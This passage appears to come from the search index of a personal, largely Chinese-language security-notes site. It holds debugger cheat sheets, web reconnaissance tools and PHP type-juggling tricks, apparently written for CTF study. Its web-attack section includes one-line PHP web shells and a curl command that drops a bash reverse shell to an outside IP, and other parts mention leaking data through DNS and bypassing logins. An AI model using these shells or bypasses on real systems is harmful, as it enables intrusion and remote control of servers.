F5:\u53cd\u7de8\u8b6f","tags":"","url":"Binary_Exploitation\/Tools_IDA_Pro.html"},{"title":"Tools-x64dbg","text":"x64dbg Table of Contents x64dbg tags: Security Tools Troubleshoot Cannot found process while attach tags: Security Tools GitHub release Troubleshoot Cannot found process while attach Options &gt; Preferences &gt; Engine &gt; check Enable Debug Privilege","tags":"","url":"Binary_Exploitation\/Tools_x64dbg.html"},{"title":"Tools-GNU Debugger","text":"GNU Debugger Table of Contents GNU Debugger tags: Security Tools Scenario replace got print return address print memory with a struct print exact address of a variable Cheat Sheet Origin Commands about process attach \/ detach kill follow-fork-mode general r (run) start disass (display assemble) modifier: ni (nexti) \/ si (stepi) n (next) \/ s (step) c (continue) print printf l (list) &lt;if available&gt; display until finish x set commands info info registers [REGISTER] about breakpoint b (break) condition delete rbreak about watch point watch &lt;if available&gt; rwatch awatch about catch point catch about frame frame up down bt (backtrace) about TUI peda angelheap tags: Security Tools Scenario replace got p &amp;stdout x\/6gx &amp;stdout set stdout as stderr(stdout has been closed) set *(long long*)0x601020 = 0x00007ffff7dd2540 print return address \u53ef\u4ee5\u770b\u5230printf\u7684return address x\/60gx $rsp - 16 print memory with a struct p\/x *(struct link_map*)0x00007ffff7ffe168 print exact address of a variable when gdb is set to C language mode (and Objective-C). p &amp;buf general info address buf Cheat Sheet Help Commands help command Get help on a certain command apropos keyword Search help for a particular keyword Starting and Quitting gdb [-tui] [-c core] [exename] (Unix Command) Start gdb on an executable or standalone; specify \"-tui\" to start the TUI GUI; specify \"-c\" with a corefile name to see where a crash occurred run [arg1] [arg2] [...] Run the currently loaded program with the given command line arguments quit Exit the debugger file exename Load an executable file by name Breakpoints and Watchpoints break location Set a breakpoint at a location, line number, or file (e.g. \"main\", \"5\", or \"hello.c:23\") watch expression Break when a variable is written to rwatch expression Break when a variable is read from awatch expression Break when a variable is written to or read from info break Display breakpoint and watchpoint information and numbers info watch Same as info break clear location Clear a breakpoint from a location delete num Delete a breakpoint or watchpoint by number Stepping and Running next Run to the next line of this function step Step into the function on this line, if possible stepi Step a single assembly instruction continue Keep running from here CTRL-C Stop running, wherever you are finish Run until the end of the current function advance location Advance to a location, line number, or file (e.g. \"somefunction\", \"5\", or \"hello.c:23\") jump location Just like continue, except jump to a particular location first. Examining and Modifying Variables display expression Display the value of a variable or expression every step of the program\u2014the expression must make sense in the current scope info display Show a list of expressions currently being displayed and their numbers undisplay num Stop showing an expression identified by its number (see info display) print expression Print the value of a variable or expression printf&nbsp;formatstr&nbsp;expressionlist Do some formatted output with printf() e.g. printf&nbsp;\"i&nbsp;=&nbsp;%d,&nbsp;p&nbsp;=&nbsp;%s\\n\",&nbsp;i,&nbsp;p set variable expression Set a variable to value, e.g. set&nbsp;variable&nbsp;x=20 set (expression) Works like set variable Window Commands info win Shows current window info focus winname Set focus to a particular window bby name (\"SRC\", \"CMD\", \"ASM\", or \"REG\") or by position (\"next\" or \"prev\") fs Alias for focus layout type Set the window layout (\"src\", \"asm\", \"split\", or \"reg\") tui reg type Set the register window layout (\"general\", \"float\", \"system\", or \"next\") winheight val Set the window height (either an absolute value, or a relative value prefaced with \"+\" or \"-\") wh Alias for winheight set&nbsp;disassembly-flavor&nbsp;flavor Set the look-and-feel of the disassembly. On Intel machines, valid flavors are intel and att Misc Commands RETURN Hit RETURN to repeat the last command backtrace Show the current stack bt Alias for backtrace attach pid Attach to an already-running process by its PID info registers Dump integer registers to screen info all-registers Dump all registers to screen Origin Commands about process $ gdb a.out attach \/ detach $ ps aux (gdb) attach $(Pid) (gdb) detach # release\u7a0b\u5f0f kill kill follow-fork-mode \u4e0d\u6703\u56e0\u70basystem(\u201cecho Hello\u201d)\uff0c\u5bb3gdb\u8df3\u6389 set follow-fork-mode parent set follow-fork-mode child general r (run) start Run debugged program until the beginning of the main procedure. disass (display assemble) modifier: \/m print source &lt;if available&gt; \/r print assemble in hex example: disass main disass \/r main disass 0x400530,0x400550 (start, end) ni (nexti) \/ si (stepi) \u57f7\u884c\u4e00\u884c\u7d44\u5408\u8a9e\u8a00 \u4e0d\u540c\u9ede\u5728\u65bc\u5047\u5982\u9047\u5230call function ni\u6703\u57f7\u884c\u5230function\u7d50\u675f n (next) \/ s (step) \u57f7\u884c\u4e00\u884csource code Execute next program line (step into\/over any function calls in the line) c (continue) \u57f7\u884c\u5230\u4e0b\u4e00\u500bbreakpoint print \u5370\u51fa\u67d0\u500b\u8b8a\u6578\u6216 memory address \u7684\u6578\u503c example: (gdb) print x $1 = 0 printf \u4e00\u6b21\u5370\u51fa\u5169\u500b\u4ee5\u4e0a\u7684\u8b8a\u6578 (gdb) print &quot;%d,%d\\n&quot;,x,y 5,2 p password[1]@5 \u5370\u51fapassword[1]\u4e4b\u5f8c5\u500b\u9663\u5217\u88e1\u7684\u503c l (list) &lt;if available&gt; \u986f\u793a\u76ee\u524d\u7a0b\u5f0f\u57f7\u884c\u5230\u90a3\u4e00\u884c display \u5370\u51fa\u67d0\u4e9b\u500b\u8b8a\u6578\u6216 memory address \u7684\u6578\u503c display a \u66ab\u6642\u95dc\u9589 disable display a \u958b\u555f enable display a \u522a\u9664 delete display a until \u57f7\u884c\u5b8c\u7576\u524d\u7684\u8ff4\u5708 until 13 \u4e00\u76f4\u57f7\u884c\u5230\u7b2c13\u884c\u505c\u4e0b\u4f86 finish \u57f7\u884c\u5b8c\u7576\u524d\u7684 function x x[\/FMT] ADDRESS Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string) and z(hex, zero padded on the left). Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes). example: x \/xw 0x80040000 \u4ee516\u9032\u4f4d\u986f\u793a\u6307\u5b9a\u5730\u5740\u7684\u503c x \/8s 0x86468700 \u986f\u793a\u6307\u5b9a\u5730\u5740\u958b\u59cb\u76848\u4e2a\u5b57\u7b26 x \/50i main \u986f\u793amain\u958b\u982d\u768450\u689d\u6307\u4ee4 x \/10i $pc x \/30gx 0x6020c0-0x10 set set *ADDRESS=VALUE set $ZF = 6 set *0xb6d2a908=0 set *(int *)0xb6daaaec=15 set *(int**)0x8048a548=0x55aa55aa gdb&gt; set *0x601030=0x4005a0 gdb&gt; x\/gx 0x601030 0x601030: 0x00007fff004005a0 gdb&gt; set {uint64_t}0x601030=0x4005a0 gdb&gt; x\/gx 0x601030 0x601030: 0x00000000004005a0 commands (gdb) commands 1 Type commands for breakpoint(s) 1, one per line. End with a line saying just &quot;end&quot;. &gt;print i &gt;print password[i] &gt;continue \u7e7c\u7e8c\u57f7\u884c &gt;end \u8f38\u5165\u5b8c\u6210 info example: info b \u5217\u51fa\u6240\u6709\u8a2d\u5b9a\u904e\u7684 breakpoint info program print\u7a0b\u5f0f\u7684\u72c0\u614b info locals \u5370\u51fa\u6240\u6709\u5340\u57df\u8b8a\u6578\u7684\u503c info registers [REGISTER] info registers \u5bdf\u770b\u6240\u6709\u66ab\u5b58\u5668\u7684\u503c(\u53ea\u5305\u62ec\u5e38\u7528\u66ab\u5b58\u5668) info registers pc \u5bdf\u770bPC\u66ab\u5b58\u5668\u7684\u503c(\u53ea\u5305\u62ec\u5e38\u7528\u66ab\u5b58\u5668) info all-registers \u67e5\u770b\u6240\u6709\u66ab\u5b58\u5668(\u5305\u62ec\u6d6e\u9ede\u66ab\u5b58\u5668) about breakpoint b (break) break LOCATION [CONDITION] b main Function: \u7576\u7a0b\u5f0f\u57f7\u884c\u5230 main \u9019\u500b function \u6642\uff0c\u7a0b\u5f0f\u6703\u66ab\u505c b *0x00000000004005f0 memory: \u7576\u7a0b\u5f0f\u57f7\u884c\u5230\u9019\u500b\u8a18\u61b6\u9ad4 address (ry break 10 LineNumber break main.c:20 FileName:LineNumber break tcpdump.c:pcap_parse FileName:Function \u52a0\u4e0a\u689d\u4ef6\u5224\u65b7 break 50 if size&gt;0 \u53ea\u5728\u689d\u4ef6\u9054\u6210\u7684\u6642\u5019\u65b7\u9ede condition \u522a\u9664\u65b7\u9ede\u4e0a\u7684\u89f8\u767c\u689d\u4ef6 delete delete 1 \u79fb\u9664\u7b2c\u4e00\u500b breakpoint rbreak rbreak REGEXP rbreak pcap_* \u7d66\u6240\u6709pcap_\u958b\u982d\u7684function\u6dfb\u52a0breakpoint about watch point watch &lt;if available&gt; \u7528\u4f86\u5075\u6e2c\u90a3\u500b\u8b8a\u6578\u7684\u503c\u6709\u88ab\u4fee\u6539\uff0c\u7576\u6307\u5b9a\u7684\u8b8a\u6578\u88ab\u66f4\u6539\u6642\uff0c\u7a0b\u5f0f\u6703\u66ab\u505c\uff0c\u4e26\u5370\u51fa\u66f4\u6539\u524d\u5f8c\u7684\u6578\u503c example: watch str \u89c0\u5bdf\u8b8a\u6578 str watch (t &gt; 10) \u89c0\u5bdf\u8b8a\u6578 t \u662f\u5426\u5927\u65bc 10 rwatch \u7576\u6307\u5b9a\u8868\u9054\u5f0f\u7684\u503c\u88ab\u8b80\u53d6\u4e86,\u5247\u7a0b\u5f0f\u505c\u6b62 awatch \u7576\u6307\u5b9a\u8868\u9054\u5f0f\u7684\u503c\u88ab\u8b80\u53d6\/\u66f4\u6539\u4e86,\u5247\u7a0b\u5f0f\u505c\u6b62 about catch point catch catch [EVENT] about frame \u6240\u6709\u7684\u7a0b\u5f0f\uff0c\u6bcf\u4e00\u500b function \u90fd\u6703\u88ab\u5206\u914d\u5230\u4e00\u500b frame \uff0c\u6bcf\u500b frame \u90fd\u662f\u4e00\u500b \u7d44\u8a9e stack \uff0c\u5b58\u653e\u6240\u6709\u7d44\u8a9e\u6307\u4ee4\uff0c\u7136\u5f8c\u518d\u4e00\u884c\u4e00\u884c\u7684\u57f7\u884c\uff0c\u4f8b\u5982\u7576\u7a0b\u5f0f\u57f7\u884c\u5230 printf \u9019\u500b function \u7684\u6642\u5019\uff0c\u5c31\u6703\u9032\u5165\u8a72 printf frame \u3002 \u57f7\u884c\u4e2d\u7684function\u70ba0 \u547c\u53eb0\u7684\u70ba1 \u547c\u53eb1\u7684\u70ba2\u2026 frame \u9032\u5165 frame 1 up \u9032\u5165\u4e0a\u4e00\u500b frame down \u9032\u5165\u4e0b\u4e00\u500b frame bt (backtrace) \u5217\u51fa\u76ee\u524d\u6240\u6709\u7684 frame about TUI Tip: layout reg layout src Standard layout\u2014source on top, command window on the bottom layout asm Just like the &quot;src&quot; layout, except it's an assembly window on top layout split Three windows: source on top, assembly in the middle, and command at the bottom layout reg Opens the register window on top of either source or assembly, whichever was opened last tui reg general Show the general registers tui reg float Show the floating point registers tui reg system Show the &quot;system&quot; registers tui reg next Show the next page of registers\u2014this is important because there might be pages of registers that aren't in the &quot;general&quot;, &quot;float&quot;, or &quot;system&quot; sets peda elfsymbol : show elf .plt section \u67e5\u770bfunction .plt vmmap : show memory mapping \u67e5\u770b process mapping \u53ef\u89c0\u5bdf\u6b0a\u9650 readelf : Get headers information from an ELF file \u67e5\u770b section \u4f4d\u7f6e \u627edata\u6bb5 find\/searchmem : Search for a pattern in memory search memeory \u4e2d\u7684 patten(\u627e\u5b57\u4e32) find \/bin\/sh record : record every instruction at runtime pattc : aaaaaaaabbbbbbbbccccccccddddddddd angelheap heapinfo chunkinfo","tags":"","url":"Binary_Exploitation\/Tools_GNU_Debugger.html"},{"title":"Tools-Immunity Debugger","text":"Immunity Debugger Table of Contents Immunity Debugger tags: Security Tools attach function plugin mona Reset windows tiling stackexchange tags: Security Tools F2 set break point attach right click &gt; run as administrator &gt; attach &gt; run &gt; close whole program &gt; repeat function go to address need to use twice plugin mona !mona find -s &quot;\\xff\\xe4&quot; -m slmfc.dll Reset windows tiling stackexchange","tags":"","url":"Binary_Exploitation\/Tools_Immunity_Debugger.html"},{"title":"Misc","text":"Web Application Attacks Main Table of Contents Web Application Attacks Main tags: Security Web Reference Tools DNSBIN Webhook Web Proxy Tools BurpSuite OWASP ZAP tcpdump Misc Attack Technical WebShell Race Condition Javascript Prototype Pollution CSS Injection tags: Security Web Reference PORTSWIGGER - Web Security Academy php weak password insecure direct object references \/user\/getAccount \/admin\/getAccount injection Command Injection CRLF Injection SQL Injection \/ NoSQL Injection XPath Injection Template Injection Kaibro - Web-CTF-Cheatsheet CTF\u6bd4\u8d5b\u603b\u662f\u8f93\uff1f\u4f60\u8fd8\u5dee\u70b9Tricks! \u7206\u7834\uff0c\u5305\u62ecmd5\u3001\u7206\u7834\u96a8\u6a5f\u6578\u3001\u9a57\u8b49\u78bc\u8b58\u5225\u7b49 \u7e5eWAF\uff0c\u5305\u62ec\u82b1\u5f0f\u7e5eMySQL\u3001\u7e5e\u6587\u4ef6\u8b80\u53d6\u95dc\u9375\u8a5e\u6aa2\u6e2c\u4e4b\u985e\u6514\u622a \u82b1\u5f0f\u73a9\u5f04\u5e7e\u500bPHP\u7279\u6027\uff0c\u5305\u62ec\u5f31\u985e\u578b\uff0c\u53cd\u5e8f\u5217\u5316+destruct\u3001\\0\u622a\u65b7\u3001iconv\u622a\u65b7 \u5bc6\u78bc\u984c\uff0c\u5305\u62echash\u9577\u5ea6\u64f4\u5c55\u3001\u4ea6\u6216\u3001\u79fb\u4f4d\u52a0\u5bc6\u5404\u7a2e\u8b8a\u5f62\u300132\u4f4d\u96a8\u6a5f\u6578\u904e\u5c0f\u3001\u96a8\u6a5f\u6578\u7a2e\u5b50\u53ef\u9810\u6e2c\u7b49 MySQL\u985e\u578b\u5dee\u7570\u3001\u5305\u62ec\u548cPHP\u5f31\u985e\u578b\u985e\u4f3c\u7684\u7279\u6027,0x\u30010b\u30010e\u4e4b\u985e\uff0cvarchar\u548cinteger\u76f8\u4e92\u8f49\u63db\uff0c\u975estrict\u6a21\u5f0f\u622a\u65b7\u7b49 open_basedir\u3001disable_function\u82b1\u5f0f\u7e5e\u904e\u6280\u5de7\uff0c\u5305\u62ecdl\u3001mail\u3001imagick\u3001bash\u6f0f\u6d1e\u3001Directorylterator\u53ca\u5404\u7a2e\u4e8c\u9032\u5236\u9078\u624b\u5dee\u8db3\u7684\u65b9\u6cd5 \u689d\u4ef6\u7af6\u722d\uff0c\u5305\u62ec\u7af6\u722d\u522a\u9664\u524d\u751f\u6210shell\u3001\u7af6\u722d\u6578\u64da\u5eab\u7121\u9396\u591a\u6263\u9322 \u793e\u4ea4\u653b\u64ca\uff0c\u5305\u62ec\u67e5whois windows\u7279\u6027\uff0c\u5305\u62ec\u77ed\u6587\u4ef6\u540d\u3001IIS\u89e3\u6790\u6f0f\u6d1e\u3001NTFS\u6587\u4ef6\u7cfb\u7d71\u901a\u914d\u7b26\u3001::$DATA\u3001\u5192\u865f\u622a\u65b7 \u5354\u8b70\uff0c\u82b1\u5f0fIP\u507d\u9020 X-Forwarded-For\/X-Client-IP\/X-Real-IP\/CDN-Src-IP\u3001\u82b1\u5f0f\u6539UA\u3001\u82b1\u5f0f\u85cfFLAG\u3001\u82b1\u5f0f\u5206\u6790\u6578\u64da\u5305 Tools DNSBIN GitHub - ettic-team\/dnsbin: dnsbin.zhack.ca GitHub - mxcxvn\/requestbin.net: requestbin.net\/dns \u6709\u6642\u5019\u53ef\u4ee5\u628a\u8981 leak \u7684\u6771\u897f\u653e\u5728 subdomain\uff0c\u50cf\u662f leak.wildfoo.tw\uff0c\u9019\u6a23\u53d7\u5bb3\u4e3b\u6a5f\u5728\u505a DNS \u67e5\u8a62\u7684\u6642\u5019\uff0c\u5c31\u6703\u628a\u8cc7\u6599\u5e36\u7d66 DNS Server Webhook GitHub - fredsted\/webhook.site: webhook.site Web Proxy Tools BurpSuite Python Requests and Burp Suite import requests proxies = {&quot;http&quot;: &quot;http:\/\/127.0.0.1:8080&quot;, &quot;https&quot;: &quot;http:\/\/127.0.0.1:8080&quot;} r = requests.get(&quot;https:\/\/www.google.com\/&quot;, proxies=proxies, verify=False) or openssl x509 -inform der -in certificate.cer -out certificate.pem export REQUESTS_CA_BUNDLE=&quot;\/path\/to\/pem\/encoded\/cert&quot; export HTTP_PROXY=&quot;http:\/\/127.0.0.1:8080&quot; export HTTPS_PROXY=&quot;http:\/\/127.0.0.1:8080&quot; OWASP ZAP tcpdump tcpdump -i lo -q tcp port 6001 -w - -i interface -q Quick output -w wirte the raw packets to file. &quot;-&quot; means stdout Misc Attack Technical WebShell &lt;?php system($_REQUEST[&quot;exec&quot;]);?&gt; curl -X POST http:\/\/10.10.10.143\/pwned.php --data-urlencode 'exec=bash -c &quot;bash -i &gt;&amp; \/dev\/tcp\/10.10.14.4\/1234 0&gt;&amp;1&quot;' Collection Race Condition Javascript Prototype Pollution CSS Injection","tags":"","url":"Web_Application_Attack\/Misc.html"},{"title":"Information Gathering","text":"Web Information Gathering Table of Contents Web Information Gathering tags: Security Web Recon Certificate information leak What targets? config methods use specific domain Web path scanner gobuster dirsearch DirBuster Fingerprint Scanning Vulnerability Scanning Nikto WPScan firefox addons flagfox wappalyzer tags: Security Web Recon Certificate Domain Enumeration (\u6191\u8b49\u7d81\u5b9a\u57df\u540d) crt.sh information leak Username \/ Password Source Code Url Route \/ File Path Config What targets? Backup \/ Version Control \/ Temporary files .git scrabble, GitHack .svn xxx.php.bak \/ www.tar.gz \/ .xxx.php.swp \/ xxx.php~ \/ xxx.phps .pyc robots.txt \/.xxx .DS_Store DS_Store_exp .htaccess package.json server-status crossdomain.xml admin\/ manager\/ login\/ backup\/ wp-login\/ phpMyAdmin\/ \/WEB-INF\/web.xml config apache2 configuration identify the path of the webroot. \/etc\/apache2\/sites-enabled\/000-default.conf methods use specific domain edit \/etc\/hosts Web path scanner gobuster gobuster dir \\ -w \/usr\/share\/wordlists\/dirbuster\/directory-list-lowercase-2.3-medium.txt \\ -x php,html \\ -u http:\/\/x.x.x.x\/ \\ -o dirbust-root.log -x string File extension(s) to search dirsearch DirBuster Fingerprint Scanning wafw00f - web application firewall detector Vulnerability Scanning Nikto Web server scanner perl nikto.pl -h {{192.168.0.1}} -p {{80,88,443}} perl nikto.pl -update WPScan Wordpress scanner firefox addons flagfox displays a flag depicting the location of the current server wappalyzer identifies software on the web","tags":"","url":"Web_Application_Attack\/Information_Gathering.html"},{"title":"Front-end Security","text":"Web Front-end Security Table of Contents Web Front-end Security tags: Security Web Same Origin Policy \u540c\u6e90\u653f\u7b56 (SOP) \u901a\u904e\u7684\u7ba1\u9053 JSONP (JSON with Padding) CORS (Cross-Origin Resource Sharing) tags: Security Web Same Origin Policy \u540c\u6e90\u653f\u7b56 (SOP) \u700f\u89bd\u5668\u7684\u5b89\u5168\u7b56\u7565\uff0c\u540c\u5354\u8b70 &amp;&amp; \u540c\u57df\u540d &amp;&amp; \u540c\u7aef\u2f1d \u624d\u7b97\u662f\u4f3a\u670d\u5668\u80fd\u8b80\u53d6\u5f97\u81ea\u5df1\u7684\u8cc7\u6e90 \u6709\u4e9b\u4f8b\u5916\u7684 tag : &lt;script&gt; &lt;img&gt; &lt;link&gt; &lt;iframe&gt; \u2026 \u901a\u904e\u7684\u7ba1\u9053 JSONP (JSON with Padding) \u5229\u7528 &lt;script&gt; \u53ef\u4ee5\u8de8\u57df\u7684\u7279\u6027\u4f86\u50b3 JSON \u8cc7\u6599 CORS (Cross-Origin Resource Sharing) mozilla \u7528 Header \u7684\u5167\u5bb9\u8ddf\u700f\u89bd\u5668\u8868\u793a\u4fe1\u4efb\u67d0\u500b domain\uff0c\u8b93\u4ed6\u9032\u884c\u8de8\u57df\u5b58\u53d6","tags":"","url":"Web_Application_Attack\/Front_end_Security.html"},{"title":"PHP Feature in Security","text":"PHP Feature in security Table of Contents PHP Feature in security tags: Security Web Online Resources Shell Other \u672c\u5730\u6e2c\u8a66 Thought of finding bugs PHP Tag PHP Weak Type PHP \u5176\u4ed6\u7279\u6027 Overflow \u6d6e\u9ede\u6578\u7cbe\u5ea6 ereg\u6703\u88abNULL\u622a\u65b7 intval extract\u8b8a\u6578\u8986\u84cb trim is_numeric in_array array_search parse_str parse_url preg_replace sprintf \/ vprintf file_put_contents spl_autoload_register \u8def\u5f91\u6b63\u898f\u5316 URL query decode OPcache PCRE\u56de\u6eaf\u6b21\u6578\u9650\u5236\u7e5e\u904e open_basedir\u7e5e\u904e disable_functions\u7e5e\u904e \u5176\u4ed6 tags: Security Web Online Resources Web Security \u9b54\u6cd5\u4f7f\u653b\u7565\u2500PHP \u662f\u4e16\u754c\u4e0a\u6700\u597d\u7684\u8a9e\u8a00 Shell cmd=ls -la&amp;html=&lt;?php if(isset($_REQUEST['cmd'])){ echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST['cmd']); system($cmd); echo &quot;&lt;\/pre&gt;&quot;; die; } html=&lt;?php system(&quot;ls -la&quot;); ?&gt; Other \u672c\u5730\u6e2c\u8a66 php &gt; var_dump(&quot;30cm&quot; == 30); bool(true) Thought of finding bugs input $_GET \/ $_POST \/ $_REQUEST $_COOKIE \/ $_SESSION $_SERVER $_FILES $_ENV Dangerous functions system shell_exec \/ exec popen \/ proc_open assert passthru create_function *_replace include \/ include_once requre \/ require_once eval (not a function) PHP Tag &lt;? ?&gt; short_open_tag \u6c7a\u5b9a\u662f\u5426\u53ef\u4f7f\u7528\u77ed\u6a19\u8a18 \u6216\u662f\u7de8\u8b6fphp\u6642 \u2013enable-short-tags &lt;?= \u7b49\u50f9 &lt;? echo \u81eaPHP 5.4.0\u8d77\uff0calways work! &lt;% %&gt;\u3001&lt;%= \u81eaPHP 7.0.0\u8d77\uff0c\u88ab\u79fb\u9664 \u9808\u5c07asp_tags\u8a2d\u6210On &lt;script language=&quot;php&quot; \u81eaPHP 7.0.0\u8d77\uff0c\u88ab\u79fb\u9664 &lt;script language=&quot;php&quot;&gt;system(&quot;id&quot;); &lt;\/script&gt; PHP Weak Type var_dump('0xABCdef' == '0xABCdef'); true (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false) var_dump('0010e2' == '1e3\u2019); true strcmp([],[]) == NULL strlen([]) == NULL sha1([]) NULL '123' == 123 'abc' == 0 '123a' == 123 '0x01' == 1 PHP 7.0\u5f8c\uff0c16\u9032\u4f4d\u5b57\u4e32\u4e0d\u518d\u7576\u6210\u6578\u5b57 e.g var_dump('0x01' == 1) =&gt; false '' == 0 == false == NULL md5([1,2,3]) == md5([4,5,6]) == NULL \u53ef\u7528\u5728\u767b\u5165\u7e5e\u904e (\u7528\u6236\u4e0d\u5b58\u5728\uff0c\u5247password\u70baNULL) var_dump(md5(240610708)); 0e462097431906509019562988736854 var_dump(sha1(10932435112)); 0e07766915004133176347055865026311692244 $a=&quot;123&quot;; $b=&quot;456&quot; $a + $b == &quot;579&quot;; $a . $b == &quot;123456&quot; $a = 0; $b = 'x'; $a == false =&gt; true $a == $b =&gt; true $b == true =&gt; true $a = 'a' ++$a =&gt; 'b' $a+1 =&gt; 1 PHP \u5176\u4ed6\u7279\u6027 Overflow 32\u4f4d\u5143 intval('1000000000000') =&gt; 2147483647 64\u4f4d\u5143 intval('100000000000000000000') =&gt; 9223372036854775807 \u6d6e\u9ede\u6578\u7cbe\u5ea6 php -r &quot;var_dump(1.000000000000001 == 1);&quot; false php -r &quot;var_dump(1.0000000000000001 == 1);&quot; true $a = 0.1 * 0.1; var_dump($a == 0.01); false ereg\u6703\u88abNULL\u622a\u65b7 var_dump(ereg(&quot;^[a-zA-Z0-9]+$&quot;, &quot;1234\\x00-!@#%&quot;)); 1 ereg\u548ceregi\u5728PHP 7.0.0.\u5df2\u7d93\u88ab\u79fb\u9664 intval \u56db\u6368\u4e94\u5165 var_dump(intval('5278.8787')); 5278 intval(012) =&gt; 10 intval(&quot;012&quot;) =&gt; 12 extract\u8b8a\u6578\u8986\u84cb extract($_GET); .php?_SESSION[name]=admin echo $_SESSION['name'] =&gt; \u2018admin\u2019 trim \u6703\u628a\u5b57\u4e32\u524d\u5f8c\u7684\u7a7a\u767d(\u6216\u5176\u4ed6\u5b57\u5143)\u53bb\u6389 \u672a\u6307\u5b9a\u7b2c\u4e8c\u53c3\u6578\uff0c\u9810\u8a2d\u6703\u53bb\u6389\u4ee5\u4e0b\u5b57\u5143 &quot; &quot; (0x20) &quot;\\t&quot; (0x09) &quot;\\n&quot; (0x0A) &quot;\\x0B&quot; (0x0B) &quot;\\r&quot; (0x0D) &quot;\\0&quot; (0x00) \u53ef\u4ee5\u767c\u73fe\u9810\u8a2d\u4e0d\u5305\u542b&quot;\\f&quot; (0x0C) \u6bd4\u8f03\uff1ais_numeric()\u5141\u8a31\\f\u5728\u958b\u982d \u5982\u679c\u53c3\u6578\u662funset\u6216\u7a7a\u7684\u8b8a\u6578\uff0c\u56de\u50b3\u503c\u662f\u7a7a\u5b57\u4e32 is_numeric is_numeric(&quot; \\t\\r\\n 123&quot;) =&gt; true is_numeric(' 87') =&gt; true is_numeric('87 ') =&gt; false is_numeric(' 87 ') =&gt; false is_numeric('0xdeadbeef') PHP &gt;= 7.0.0 =&gt; false PHP &lt; 7.0.0 =&gt; true \u53ef\u4ee5\u62ff\u4f86\u7e5e\u904e\u6ce8\u5165 \u4ee5\u4e0b\u4ea6\u70ba\u5408\u6cd5(\u8fd4\u56deTrue)\u5b57\u4e32: ' -.0' '0.' ' +2.1e5' ' -1.5E+25' '1.e5' in_array in_array('5 or 1=1', array(1, 2, 3, 4, 5)) true in_array('kaibro', array(0, 1, 2)) true in_array(array(), array('kai'=&gt;false)) true in_array(array(), array('kai'=&gt;null)) true in_array(array(), array('kai'=&gt;0)) false in_array(array(), array('kai'=&gt;'bro')) false in_array('kai', array('kai'=&gt;true)) true in_array('kai', array('kai'=&gt;'bro')) false in_array('kai', array('kai'=&gt;0)) true in_array('kai', array('kai'=&gt;1)) false array_search mixed array_search(mixed $needle , array $haystack [, bool $strict = false ]) \u5728haystack\u9663\u5217\u4e2d\uff0c\u641c\u5c0bneedle\u7684\u503c\uff0c\u6210\u529f\u5247\u8fd4\u56deindex\uff0c\u5931\u6557\u8fd4\u56deFalse $strict\u70bafalse\u6642\uff0c\u63a1\u7528\u4e0d\u56b4\u683c\u6bd4\u8f03 \u9810\u8a2d\u662fFalse Example $arr=array(1,2,0); var_dump(array_search('kai', $arr)) int(2) $arr=array(1,2,0); var_dump(array_search('1', $arr)) int(0) parse_str parse_str(string, array) \u6703\u628a\u67e5\u8a62\u5b57\u4e32\u89e3\u6790\u5230\u8b8a\u6578\u4e2d \u5982\u679c\u672a\u8a2d\u7f6e\u7b2c\u4e8c\u500b\u53c3\u6578\uff0c\u6703\u89e3\u6790\u5230\u540c\u540d\u8b8a\u6578\u4e2d PHP7.2\u4e2d\u4e0d\u8a2d\u7f6e\u7b2c\u4e8c\u500b\u53c3\u6578\u6703\u7522\u751fE_DEPRECATED\u8b66\u544a parse_str('gg[kaibro]=5566'); array(1) { [&quot;kaibro&quot;]=&gt; string(4) &quot;5566&quot; } PHP\u8b8a\u6578\u6709\u7a7a\u683c\u548c.\uff0c\u6703\u88ab\u8f49\u6210\u5e95\u7dda parse_str(&quot;na.me=kaibro&amp;pass wd=ggininder&quot;,$test); var_dump($test); array(2) { [&quot;na_me&quot;]=&gt; string(6) &quot;kaibro&quot; [&quot;pass_wd&quot;]=&gt; string(9) &quot;ggininder&quot; } parse_url \u5728\u8655\u7406\u50b3\u5165\u7684URL\u6703\u6709\u554f\u984c parse_url('\/a.php?id=1') array(2) { [&quot;host&quot;]=&gt; string(5) &quot;a.php&quot; [&quot;query&quot;]=&gt; string(4) &quot;id=1&quot; } parse_url('\/\/a\/b') host: a parse_url('..\/\/a\/b\/c:80') host: .. port: 80 path: \/\/a\/b\/c:80 parse_url('\/\/\/a.php?id=1') false parse_url('\/a.php?id=1:80') PHP &lt; 7.0.0 false PHP &gt;= 7.0.0 array(2) { [&quot;path&quot;]=&gt; string(6) &quot;\/a.php&quot; [&quot;query&quot;]=&gt; string(7) &quot;id=1:80&quot; } parse_url('http:\/\/kaibro.tw:87878') 5.3.X\u7248\u672c\u4ee5\u4e0b array(3) { [\"scheme\"]=&gt; string(4) \"http\" [\"host\"]=&gt; string(9) \"kaibro.tw\" [\"port\"]=&gt; int(22342) } \u5176\u4ed6\uff1a false preg_replace mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) \u641c\u5c0b$subject\u4e2d\u5339\u914d\u7684$pattern\uff0c\u4e26\u7528$replacement\u66ff\u63db \u7b2c\u4e00\u500b\u53c3\u6578\u7528\/e\u4fee\u98fe\u7b26\uff0c$replacement\u6703\u88ab\u7576\u6210PHP code\u57f7\u884c \u5fc5\u9808\u6709\u5339\u914d\u5230\u624d\u6703\u57f7\u884c PHP 5.5.0\u8d77\uff0c\u6703\u7522\u751fE_DEPRECATED\u932f\u8aa4 PHP 7.0.0\u4e0d\u518d\u652f\u63f4\uff0c\u7528preg_replace_callback()\u4ee3\u66ff example: &lt;?php $a='phpkaibro'; echo preg_replace('\/(.*)kaibro\/e','\\\\1info()',$a); sprintf \/ vprintf \u5c0d\u683c\u5f0f\u5316\u5b57\u4e32\u7684\u985e\u578b\u6c92\u6aa2\u67e5 \u683c\u5f0f\u5316\u5b57\u4e32\u4e2d%\u5f8c\u9762\u7684\u5b57\u5143(\u9664\u4e86%\u4e4b\u5916)\u6703\u88ab\u7576\u6210\u5b57\u4e32\u985e\u578b\u5403\u6389 \u4f8b\u5982%\\\u3001%'\u3001%1$\\' \u5728\u67d0\u4e9bSQLi\u904e\u6ffe\u72c0\u6cc1\u4e0b\uff0c%' and 1=1#\u4e2d\u7684\u55ae\u5f15\u865f\u6703\u88ab\u8f49\u7fa9\u6210\\'\uff0c%\\\u53c8\u6703\u88ab\u5403\u6389\uff0c'\u6210\u529f\u9003\u9038 